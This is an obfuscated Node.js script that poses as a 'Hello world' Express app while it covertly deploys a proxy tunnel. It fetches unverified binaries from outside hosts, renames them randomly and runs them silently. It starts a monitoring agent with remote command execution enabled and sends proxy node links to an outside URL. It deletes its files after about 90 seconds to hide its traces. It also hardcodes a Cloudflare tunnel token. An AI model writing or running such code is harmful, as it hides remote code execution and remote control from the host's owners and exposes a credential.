const _0x4083e5=_0x5815;(function(_0x170d0f,_0x543361){const _0x228b96=_0x5815,_0x168ad9=_0x170d0f();while(!![]){try{const _0x59feba=-parseInt(_0x228b96(0xb5))/0x1+-parseInt(_0x228b96(0x95))/0x2+parseInt(_0x228b96(0xed))/0x3*(parseInt(_0x228b96(0x130))/0x4)+-parseInt(_0x228b96(0x123))/0x5+parseInt(_0x228b96(0xe3))/0x6*(-parseInt(_0x228b96(0xc8))/0x7)+-parseInt(_0x228b96(0xf5))/0x8*(-parseInt(_0x228b96(0xc5))/0x9)+parseInt(_0x228b96(0x10a))/0xa;if(_0x59feba===_0x543361)break;else _0x168ad9['push'](_0x168ad9['shift']());}catch(_0x2423e8){_0x168ad9['push'](_0x168ad9['shift']());}}}(_0x6cb9,0xdaf0f));const express=require(_0x4083e5(0x11c)),app=express(),axios=require(_0x4083e5(0xd9)),os=require('os'),fs=require('fs'),path=require(_0x4083e5(0xcf)),{promisify}=require(_0x4083e5(0xaa)),exec=promisify(require('child_process')[_0x4083e5(0xe1)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4083e5(0xe5)][_0x4083e5(0xfb)]||'',PROJECT_URL=process[_0x4083e5(0xe5)][_0x4083e5(0x109)]||'',AUTO_ACCESS=process['env'][_0x4083e5(0xf4)]||![],FILE_PATH=process[_0x4083e5(0xe5)][_0x4083e5(0xf8)]||_0x4083e5(0x128),SUB_PATH=process['env'][_0x4083e5(0x11e)]||_0x4083e5(0x136),PORT=process[_0x4083e5(0xe5)]['SERVER_PORT']||process[_0x4083e5(0xe5)][_0x4083e5(0x131)]||0xbb8,UUID=process[_0x4083e5(0xe5)][_0x4083e5(0x122)]||_0x4083e5(0xa8),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x4083e5(0x126)]||'',NEZHA_KEY=process[_0x4083e5(0xe5)][_0x4083e5(0xdb)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'koyebde.xiangyu-group.com.cn',ARGO_AUTH=process[_0x4083e5(0xe5)][_0x4083e5(0x110)]||_0x4083e5(0x10e),ARGO_PORT=process[_0x4083e5(0xe5)][_0x4083e5(0x137)]||0x1f41,CFIP=process[_0x4083e5(0xe5)][_0x4083e5(0x92)]||_0x4083e5(0xb3),CFPORT=process['env'][_0x4083e5(0x9b)]||0x1bb,NAME=process[_0x4083e5(0xe5)]['NAME']||'';!fs[_0x4083e5(0x12e)](FILE_PATH)?(fs[_0x4083e5(0xb1)](FILE_PATH),console[_0x4083e5(0xec)](FILE_PATH+'\x20is\x20created')):console[_0x4083e5(0xec)](FILE_PATH+_0x4083e5(0xbe));function _0x6cb9(){const _0x5d80bb=['true','NEZHA\x20variable\x20is\x20empty,skip\x20running','Empowerment\x20failed\x20for\x20','tunnel.yml','map','test','log','3kdfqEY','/dev/null','Download\x20','\x20-s\x20','http','https://arm64.ssss.nyc.mn/bot','utf-8','AUTO_ACCESS','4696EHaBln','amd','message','FILE_PATH','App\x20is\x20running','?security=tls&sni=','UPLOAD_URL','split','taskkill\x20/f\x20/im\x20','https://arm64.ssss.nyc.mn/v1','Error\x20in\x20startserver:','Nodes\x20uploaded\x20successfully','\x0a\x20\x20\x0atrojan://','https+local://8.8.8.8/dns-query','error','config.yaml','all','status','basename','http\x20server\x20is\x20running\x20on\x20port:','PROJECT_URL','9547920tuSndd','npm\x20running\x20error:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','Content-Type','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiOWZmYjVjOTgtZDcyMy00ZjA0LWFhMWYtYTM4MTUzZDhlNTZhIiwicyI6IllUUmxaalEyTkdNdE9UWTRNaTAwTWpSaExUa3lPVGd0TjJJellqRXlOV1F3WlRNdyJ9','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_AUTH','arm','tls','\x0a\x20\x20\x0avmess://','match','/api/delete-nodes','\x0aclient_secret:\x20','length','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','platform','statSync','\x20-c\x20','express','https://amd64.ssss.nyc.mn/v1','SUB_PATH','finish','?encryption=none&security=tls&sni=','\x0a\x20\x20\x20\x20','UUID','1854005VIiRVV','trojan','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_PORT','/vmess-argo?ed=2560','./tmp','Error\x20executing\x20command:\x20','Empowerment\x20success\x20for\x20','fileName','https://amd64.ssss.nyc.mn/bot','/trojan-argo','existsSync','2053','4804160ZWbxhf','PORT','8443','forEach','/tunnel.yml\x20run','rm\x20-rf\x20','subabc','ARGO_PORT','sub.txt','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','--tls','/vmess-argo','get','2096','readFileSync','\x20-p\x20','fileUrl','base64','\x20>\x20nul\x202>&1','join','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','direct','Add\x20automatic\x20access\x20task\x20faild:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','trim','\x20is\x20running','charAt','listen','none','response','\x0a\x20\x20credentials-file:\x20','CFIP','from','unlinkSync','1092386DdmQuA','arm64','Unhandled\x20error\x20in\x20startserver:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','writeFileSync','&path=%2Fvless-argo%3Fed%3D2560#','CFPORT','Error\x20reading\x20boot.log:','text/plain;\x20charset=utf-8','/sub.txt\x20saved\x20successfully','includes','\x22\x20>\x20/dev/null\x202>&1','2083','127.0.0.1','close','\x20>/dev/null\x202>&1\x20&','2087','unshift','floor','bc97f674-c578-4940-9234-0a1da46041b9','.exe\x20>\x20nul\x202>&1','util','/vless-argo','\x20failed:\x20','boot.log','\x20>/dev/null\x202>&1','stringify','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','mkdirSync','&fp=firefox&type=ws&host=','saas.sin.fan','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','856225nGOVAZ','php\x20running\x20error:\x20','post','automatic\x20access\x20task\x20added\x20successfully','blackhole','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','pkill\x20-f\x20\x22[','\x0a\x20\x20tunnel:\x20','clear','\x20already\x20exists','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Hello\x20world!','vless','toString','/api/add-subscriptions','send','14589MBPLuU','application/json','then','7eoyfTM','https://arm64.ssss.nyc.mn/agent','set','tcp','firefox','catch','ArgoDomain:','path','Subscription\x20uploaded\x20successfully','win32','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','substring','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','config.json','random','push','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','axios','https://oooo.serv00.net/add-url','NEZHA_KEY','xtls-rprx-vision','quic','nohup\x20','abcdefghijklmnopqrstuvwxyz','443','exec','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','2624142FmoyKN','ARGO_DOMAIN:','env'];_0x6cb9=function(){return _0x5d80bb;};return _0x6cb9();}function generateRandomName(){const _0x2b3063=_0x4083e5,_0x5eff7b=_0x2b3063(0xdf);let _0x13a00b='';for(let _0x56754e=0x0;_0x56754e<0x6;_0x56754e++){_0x13a00b+=_0x5eff7b['charAt'](Math[_0x2b3063(0xa7)](Math[_0x2b3063(0xd6)]()*_0x5eff7b[_0x2b3063(0x117)]));}return _0x13a00b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4083e5(0x85)](FILE_PATH,phpName),webPath=path[_0x4083e5(0x85)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x4083e5(0x85)](FILE_PATH,_0x4083e5(0x138)),listPath=path[_0x4083e5(0x85)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4083e5(0x85)](FILE_PATH,_0x4083e5(0xad)),configPath=path[_0x4083e5(0x85)](FILE_PATH,_0x4083e5(0xd5));function deleteNodes(){const _0x5ee5cc=_0x4083e5;try{if(!UPLOAD_URL)return;if(!fs[_0x5ee5cc(0x12e)](subPath))return;let _0x493f46;try{_0x493f46=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x264394=Buffer[_0x5ee5cc(0x93)](_0x493f46,'base64')[_0x5ee5cc(0xc2)](_0x5ee5cc(0xf3)),_0x450700=_0x264394[_0x5ee5cc(0xfc)]('\x0a')['filter'](_0xc9e018=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5ee5cc(0xeb)](_0xc9e018));if(_0x450700[_0x5ee5cc(0x117)]===0x0)return;return axios[_0x5ee5cc(0xb7)](UPLOAD_URL+_0x5ee5cc(0x115),JSON[_0x5ee5cc(0xaf)]({'nodes':_0x450700}),{'headers':{'Content-Type':_0x5ee5cc(0xc6)}})[_0x5ee5cc(0xcd)](_0x581df5=>{return null;}),null;}catch(_0x348f6b){return null;}}function cleanupOldFiles(){const _0x88842b=_0x4083e5;try{const _0x285b1d=fs['readdirSync'](FILE_PATH);_0x285b1d[_0x88842b(0x133)](_0xa5f48=>{const _0x2f416c=_0x88842b,_0x26cd08=path[_0x2f416c(0x85)](FILE_PATH,_0xa5f48);try{const _0x3286f5=fs[_0x2f416c(0x11a)](_0x26cd08);_0x3286f5['isFile']()&&fs[_0x2f416c(0x94)](_0x26cd08);}catch(_0x219609){}});}catch(_0x513a14){}}app[_0x4083e5(0x13c)]('/',function(_0x43b5c7,_0x3f2be8){const _0x3c6b30=_0x4083e5;_0x3f2be8[_0x3c6b30(0xc4)](_0x3c6b30(0xc0));});async function generateConfig(){const _0x6c367=_0x4083e5,_0x4a6425={'log':{'access':'/dev/null','error':_0x6c367(0xee),'loglevel':_0x6c367(0x8f)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x6c367(0xc1),'settings':{'clients':[{'id':UUID,'flow':_0x6c367(0xdc)}],'decryption':_0x6c367(0x8f),'fallbacks':[{'dest':0xbb9},{'path':_0x6c367(0xab),'dest':0xbba},{'path':_0x6c367(0x13b),'dest':0xbbb},{'path':_0x6c367(0x12d),'dest':0xbbc}]},'streamSettings':{'network':_0x6c367(0xcb)}},{'port':0xbb9,'listen':_0x6c367(0xa2),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x6c367(0x8f)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x6c367(0x8f)},'streamSettings':{'network':'ws','security':_0x6c367(0x8f),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x6c367(0xf1),'tls',_0x6c367(0xdd)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x6c367(0x13b)}},'sniffing':{'enabled':!![],'destOverride':[_0x6c367(0xf1),_0x6c367(0x112),_0x6c367(0xdd)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x6c367(0xa2),'protocol':_0x6c367(0x124),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x6c367(0x8f),'wsSettings':{'path':_0x6c367(0x12d)}},'sniffing':{'enabled':!![],'destOverride':[_0x6c367(0xf1),_0x6c367(0x112),_0x6c367(0xdd)],'metadataOnly':![]}}],'dns':{'servers':[_0x6c367(0x102)]},'outbounds':[{'protocol':'freedom','tag':_0x6c367(0x87)},{'protocol':_0x6c367(0xb9),'tag':'block'}]};fs[_0x6c367(0x99)](path['join'](FILE_PATH,_0x6c367(0xd5)),JSON['stringify'](_0x4a6425,null,0x2));}function getSystemArchitecture(){const _0x203d39=_0x4083e5,_0x38f81f=os['arch']();return _0x38f81f==='arm'||_0x38f81f===_0x203d39(0x96)||_0x38f81f==='aarch64'?_0x203d39(0x111):_0x203d39(0xf6);}function downloadFile(_0x561179,_0x512ca8,_0x596689){const _0x1cabf2=_0x4083e5,_0x1474f9=_0x561179;!fs[_0x1cabf2(0x12e)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4d529b=fs['createWriteStream'](_0x1474f9);axios({'method':_0x1cabf2(0x13c),'url':_0x512ca8,'responseType':'stream'})[_0x1cabf2(0xc7)](_0x53a097=>{const _0x27a5f3=_0x1cabf2;_0x53a097['data']['pipe'](_0x4d529b),_0x4d529b['on'](_0x27a5f3(0x11f),()=>{const _0x43851b=_0x27a5f3;_0x4d529b[_0x43851b(0xa3)](),console[_0x43851b(0xec)](_0x43851b(0xef)+path[_0x43851b(0x107)](_0x1474f9)+'\x20successfully'),_0x596689(null,_0x1474f9);}),_0x4d529b['on'](_0x27a5f3(0x103),_0x560ba4=>{const _0x3f50a7=_0x27a5f3;fs['unlink'](_0x1474f9,()=>{});const _0x3bd815='Download\x20'+path[_0x3f50a7(0x107)](_0x1474f9)+'\x20failed:\x20'+_0x560ba4[_0x3f50a7(0xf7)];console[_0x3f50a7(0x103)](_0x3bd815),_0x596689(_0x3bd815);});})[_0x1cabf2(0xcd)](_0x24c1ea=>{const _0x3db4fd=_0x1cabf2,_0x35623c=_0x3db4fd(0xef)+path[_0x3db4fd(0x107)](_0x1474f9)+_0x3db4fd(0xac)+_0x24c1ea[_0x3db4fd(0xf7)];console[_0x3db4fd(0x103)](_0x35623c),_0x596689(_0x35623c);});}function _0x5815(_0x35994e,_0x47ba5e){_0x35994e=_0x35994e-0x80;const _0x6cb936=_0x6cb9();let _0x581598=_0x6cb936[_0x35994e];return _0x581598;}async function downloadFilesAndRun(){const _0x42b8a9=_0x4083e5,_0x358029=getSystemArchitecture(),_0x30100b=getFilesForArchitecture(_0x358029);if(_0x30100b[_0x42b8a9(0x117)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x354705=_0x30100b[_0x42b8a9(0xea)](_0x3af80a=>{return new Promise((_0x161594,_0x212c1b)=>{const _0x1b9092=_0x5815;downloadFile(_0x3af80a[_0x1b9092(0x12b)],_0x3af80a[_0x1b9092(0x82)],(_0x39dab2,_0x22b366)=>{_0x39dab2?_0x212c1b(_0x39dab2):_0x161594(_0x22b366);});});});try{await Promise[_0x42b8a9(0x105)](_0x354705);}catch(_0x2eb3fb){console[_0x42b8a9(0x103)]('Error\x20downloading\x20files:',_0x2eb3fb);return;}function _0x37e322(_0xf5e7dc){const _0x453aa9=_0x42b8a9,_0x122c87=0x1fd;_0xf5e7dc[_0x453aa9(0x133)](_0x525a6c=>{fs['existsSync'](_0x525a6c)&&fs['chmod'](_0x525a6c,_0x122c87,_0x2bb75d=>{const _0x3ddc8b=_0x5815;_0x2bb75d?console['error'](_0x3ddc8b(0xe8)+_0x525a6c+':\x20'+_0x2bb75d):console[_0x3ddc8b(0xec)](_0x3ddc8b(0x12a)+_0x525a6c+':\x20'+_0x122c87[_0x3ddc8b(0xc2)](0x8));});});}const _0x529ca1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x37e322(_0x529ca1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1bc250=NEZHA_SERVER[_0x42b8a9(0x9f)](':')?NEZHA_SERVER[_0x42b8a9(0xfc)](':')['pop']():'',_0x11715d=new Set([_0x42b8a9(0xe0),_0x42b8a9(0x132),_0x42b8a9(0x13d),_0x42b8a9(0xa5),'2083','2053']),_0xb1a219=_0x11715d['has'](_0x1bc250)?_0x42b8a9(0xe6):'false',_0x47fea4=_0x42b8a9(0x116)+NEZHA_KEY+_0x42b8a9(0xd2)+NEZHA_SERVER+_0x42b8a9(0xbf)+_0xb1a219+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x42b8a9(0x99)](path['join'](FILE_PATH,_0x42b8a9(0x104)),_0x47fea4);const _0x1f6226='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x42b8a9(0x118);try{await exec(_0x1f6226),console[_0x42b8a9(0xec)](phpName+_0x42b8a9(0x8c)),await new Promise(_0x18702a=>setTimeout(_0x18702a,0x3e8));}catch(_0x364957){console[_0x42b8a9(0x103)](_0x42b8a9(0xb6)+_0x364957);}}else{let _0x339e2e='';const _0x58a0c9=[_0x42b8a9(0xe0),'8443',_0x42b8a9(0x13d),_0x42b8a9(0xa5),_0x42b8a9(0xa1),_0x42b8a9(0x12f)];_0x58a0c9[_0x42b8a9(0x9f)](NEZHA_PORT)&&(_0x339e2e=_0x42b8a9(0x13a));const _0x192eba='nohup\x20'+npmPath+_0x42b8a9(0xf0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x42b8a9(0x81)+NEZHA_KEY+'\x20'+_0x339e2e+_0x42b8a9(0x98);try{await exec(_0x192eba),console[_0x42b8a9(0xec)](npmName+_0x42b8a9(0x8c)),await new Promise(_0x40399d=>setTimeout(_0x40399d,0x3e8));}catch(_0x22681f){console['error'](_0x42b8a9(0x10b)+_0x22681f);}}}else console[_0x42b8a9(0xec)](_0x42b8a9(0xe7));const _0x3f6feb=_0x42b8a9(0xde)+webPath+_0x42b8a9(0x11b)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3f6feb),console['log'](webName+'\x20is\x20running'),await new Promise(_0xab9798=>setTimeout(_0xab9798,0x3e8));}catch(_0x55ebc4){console[_0x42b8a9(0x103)]('web\x20running\x20error:\x20'+_0x55ebc4);}if(fs[_0x42b8a9(0x12e)](botPath)){let _0x5cff32;if(ARGO_AUTH[_0x42b8a9(0x114)](/^[A-Z0-9a-z=]{120,250}$/))_0x5cff32=_0x42b8a9(0x86)+ARGO_AUTH;else ARGO_AUTH[_0x42b8a9(0x114)](/TunnelSecret/)?_0x5cff32=_0x42b8a9(0xb0)+FILE_PATH+_0x42b8a9(0x134):_0x5cff32=_0x42b8a9(0xd4)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5cff32+'\x20>/dev/null\x202>&1\x20&'),console[_0x42b8a9(0xec)](botName+'\x20is\x20running'),await new Promise(_0x2651b0=>setTimeout(_0x2651b0,0x7d0));}catch(_0x209709){console[_0x42b8a9(0x103)](_0x42b8a9(0x129)+_0x209709);}}await new Promise(_0x3db85b=>setTimeout(_0x3db85b,0x1388));}function getFilesForArchitecture(_0x435dd0){const _0x1f11f1=_0x4083e5;let _0x39d869;_0x435dd0==='arm'?_0x39d869=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1f11f1(0xf2)}]:_0x39d869=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1f11f1(0x12c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x236c71=_0x435dd0===_0x1f11f1(0x111)?_0x1f11f1(0xc9):'https://amd64.ssss.nyc.mn/agent';_0x39d869[_0x1f11f1(0xa6)]({'fileName':npmPath,'fileUrl':_0x236c71});}else{const _0x13e0db=_0x435dd0==='arm'?_0x1f11f1(0xfe):_0x1f11f1(0x11d);_0x39d869[_0x1f11f1(0xa6)]({'fileName':phpPath,'fileUrl':_0x13e0db});}}return _0x39d869;}function argoType(){const _0x32ec0f=_0x4083e5;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x32ec0f(0xec)](_0x32ec0f(0x125));return;}if(ARGO_AUTH[_0x32ec0f(0x9f)]('TunnelSecret')){fs[_0x32ec0f(0x99)](path[_0x32ec0f(0x85)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xe404e1=_0x32ec0f(0xbc)+ARGO_AUTH[_0x32ec0f(0xfc)]('\x22')[0xb]+_0x32ec0f(0x91)+path['join'](FILE_PATH,'tunnel.json')+_0x32ec0f(0xba)+ARGO_DOMAIN+_0x32ec0f(0xe2)+ARGO_PORT+_0x32ec0f(0x8a);fs[_0x32ec0f(0x99)](path[_0x32ec0f(0x85)](FILE_PATH,_0x32ec0f(0xe9)),_0xe404e1);}else console['log'](_0x32ec0f(0x139));}argoType();async function extractDomains(){const _0x3c9d17=_0x4083e5;let _0xd02487;if(ARGO_AUTH&&ARGO_DOMAIN)_0xd02487=ARGO_DOMAIN,console[_0x3c9d17(0xec)](_0x3c9d17(0xe4),_0xd02487),await _0x12cf04(_0xd02487);else try{const _0x269310=fs[_0x3c9d17(0x80)](path[_0x3c9d17(0x85)](FILE_PATH,_0x3c9d17(0xad)),_0x3c9d17(0xf3)),_0x3be93f=_0x269310['split']('\x0a'),_0x181c0a=[];_0x3be93f[_0x3c9d17(0x133)](_0x45f96a=>{const _0x129f19=_0x3c9d17,_0x570829=_0x45f96a[_0x129f19(0x114)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x570829){const _0x27352a=_0x570829[0x1];_0x181c0a['push'](_0x27352a);}});if(_0x181c0a[_0x3c9d17(0x117)]>0x0)_0xd02487=_0x181c0a[0x0],console[_0x3c9d17(0xec)](_0x3c9d17(0xce),_0xd02487),await _0x12cf04(_0xd02487);else{console[_0x3c9d17(0xec)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3c9d17(0x94)](path[_0x3c9d17(0x85)](FILE_PATH,_0x3c9d17(0xad)));async function _0x253353(){const _0x28cf43=_0x3c9d17;try{process[_0x28cf43(0x119)]===_0x28cf43(0xd1)?await exec(_0x28cf43(0xfd)+botName+_0x28cf43(0xa9)):await exec(_0x28cf43(0xbb)+botName[_0x28cf43(0x8d)](0x0)+']'+botName[_0x28cf43(0xd3)](0x1)+_0x28cf43(0xa0));}catch(_0x4f9d0c){}}_0x253353(),await new Promise(_0x1f7d33=>setTimeout(_0x1f7d33,0xbb8));const _0x56ad52='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3c9d17(0x89)+ARGO_PORT;try{await exec(_0x3c9d17(0xde)+botPath+'\x20'+_0x56ad52+_0x3c9d17(0xa4)),console[_0x3c9d17(0xec)](botName+'\x20is\x20running'),await new Promise(_0x5ca1c7=>setTimeout(_0x5ca1c7,0xbb8)),await extractDomains();}catch(_0x34d883){console[_0x3c9d17(0x103)](_0x3c9d17(0x129)+_0x34d883);}}}catch(_0x4449d7){console['error'](_0x3c9d17(0x9c),_0x4449d7);}async function _0x12cf04(_0x3c22bb){const _0x56f70e=_0x3c9d17,_0x2d3be8=execSync(_0x56f70e(0xd8),{'encoding':_0x56f70e(0xf3)}),_0x4b5004=_0x2d3be8[_0x56f70e(0x8b)](),_0x2fe916=NAME?NAME+'-'+_0x4b5004:_0x4b5004;return new Promise(_0x2d04c0=>{setTimeout(()=>{const _0x58da60=_0x5815,_0x3af358={'v':'2','ps':''+_0x2fe916,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x58da60(0x8f),'net':'ws','type':_0x58da60(0x8f),'host':_0x3c22bb,'path':_0x58da60(0x127),'tls':_0x58da60(0x112),'sni':_0x3c22bb,'alpn':'','fp':_0x58da60(0xcc)},_0x11e7b7='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x58da60(0x120)+_0x3c22bb+_0x58da60(0xb2)+_0x3c22bb+_0x58da60(0x9a)+_0x2fe916+_0x58da60(0x113)+Buffer[_0x58da60(0x93)](JSON[_0x58da60(0xaf)](_0x3af358))[_0x58da60(0xc2)](_0x58da60(0x83))+_0x58da60(0x101)+UUID+'@'+CFIP+':'+CFPORT+_0x58da60(0xfa)+_0x3c22bb+_0x58da60(0xb2)+_0x3c22bb+_0x58da60(0x10c)+_0x2fe916+_0x58da60(0x121);console['log'](Buffer[_0x58da60(0x93)](_0x11e7b7)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0x58da60(0x93)](_0x11e7b7)[_0x58da60(0xc2)]('base64')),console['log'](FILE_PATH+_0x58da60(0x9e)),uploadNodes(),app[_0x58da60(0x13c)]('/'+SUB_PATH,(_0x52c947,_0x3c6fe7)=>{const _0x4e9077=_0x58da60,_0x3f48cc=Buffer[_0x4e9077(0x93)](_0x11e7b7)[_0x4e9077(0xc2)](_0x4e9077(0x83));_0x3c6fe7[_0x4e9077(0xca)](_0x4e9077(0x10d),_0x4e9077(0x9d)),_0x3c6fe7[_0x4e9077(0xc4)](_0x3f48cc);}),_0x2d04c0(_0x11e7b7);},0x7d0);});}}async function uploadNodes(){const _0x5efa8c=_0x4083e5;if(UPLOAD_URL&&PROJECT_URL){const _0x1f5c97=PROJECT_URL+'/'+SUB_PATH,_0x57374b={'subscription':[_0x1f5c97]};try{const _0x1dafdc=await axios[_0x5efa8c(0xb7)](UPLOAD_URL+_0x5efa8c(0xc3),_0x57374b,{'headers':{'Content-Type':_0x5efa8c(0xc6)}});return _0x1dafdc&&_0x1dafdc[_0x5efa8c(0x106)]===0xc8?(console[_0x5efa8c(0xec)](_0x5efa8c(0xd0)),_0x1dafdc):null;}catch(_0x3495d2){if(_0x3495d2[_0x5efa8c(0x90)]){if(_0x3495d2['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5efa8c(0x12e)](listPath))return;const _0x4957d1=fs[_0x5efa8c(0x80)](listPath,_0x5efa8c(0xf3)),_0x44c172=_0x4957d1[_0x5efa8c(0xfc)]('\x0a')['filter'](_0x3434ad=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5efa8c(0xeb)](_0x3434ad));if(_0x44c172[_0x5efa8c(0x117)]===0x0)return;const _0x5ea3c3=JSON[_0x5efa8c(0xaf)]({'nodes':_0x44c172});try{const _0x46fe79=await axios[_0x5efa8c(0xb7)](UPLOAD_URL+'/api/add-nodes',_0x5ea3c3,{'headers':{'Content-Type':'application/json'}});return _0x46fe79&&_0x46fe79['status']===0xc8?(console[_0x5efa8c(0xec)](_0x5efa8c(0x100)),_0x46fe79):null;}catch(_0x51b8c0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5e9332=_0x5815,_0x15b67e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x15b67e[_0x5e9332(0xd7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x15b67e[_0x5e9332(0xd7)](phpPath);process[_0x5e9332(0x119)]===_0x5e9332(0xd1)?exec('del\x20/f\x20/q\x20'+_0x15b67e[_0x5e9332(0x85)]('\x20')+_0x5e9332(0x84),_0x260c04=>{const _0x5467af=_0x5e9332;console[_0x5467af(0xbd)](),console[_0x5467af(0xec)](_0x5467af(0xf9)),console[_0x5467af(0xec)](_0x5467af(0xb4));}):exec(_0x5e9332(0x135)+_0x15b67e[_0x5e9332(0x85)]('\x20')+_0x5e9332(0xae),_0x41bb84=>{const _0x316f85=_0x5e9332;console[_0x316f85(0xbd)](),console[_0x316f85(0xec)](_0x316f85(0xf9)),console[_0x316f85(0xec)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2007c2=_0x4083e5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2007c2(0xec)](_0x2007c2(0x10f));return;}try{const _0x13b2b2=await axios[_0x2007c2(0xb7)](_0x2007c2(0xda),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2007c2(0xc6)}});return console[_0x2007c2(0xec)](_0x2007c2(0xb8)),_0x13b2b2;}catch(_0x3df3e4){return console['error'](_0x2007c2(0x88)+_0x3df3e4[_0x2007c2(0xf7)]),null;}}async function startserver(){const _0x1692b0=_0x4083e5;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xea503b){console[_0x1692b0(0x103)](_0x1692b0(0xff),_0xea503b);}}startserver()['catch'](_0x11294e=>{const _0x58947b=_0x4083e5;console[_0x58947b(0x103)](_0x58947b(0x97),_0x11294e);}),app[_0x4083e5(0x8e)](PORT,()=>console[_0x4083e5(0xec)](_0x4083e5(0x108)+PORT+'!'));
